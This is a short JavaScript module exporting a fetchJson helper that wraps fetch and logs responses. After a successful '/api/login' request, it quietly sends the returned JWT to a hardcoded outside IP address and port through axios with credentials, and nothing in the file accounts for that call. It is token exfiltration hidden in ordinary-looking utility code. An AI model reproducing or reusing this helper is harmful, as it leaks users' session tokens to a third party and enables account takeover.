import axios from 'axios';

export default async function fetchJson(input, init) {
  const response = await fetch(input, init);
  const data = await response.json();

  console.log(data);
  if (data.success) {
    console.log(input);
    if (input === '/api/login') {
      console.log('Hi');
      try {
        const redirectToken = await axios(`http://61.74.187.4:7100/?jwt=${data.jwt}`, { withCredentials: true });
      } catch (error) {
        console.log(error.message);
        throw new Error((error).message);
      }
    }

    return response;
  } else {
    console.log('fetch error')
    throw new Error(JSON.stringify(data));
  }
}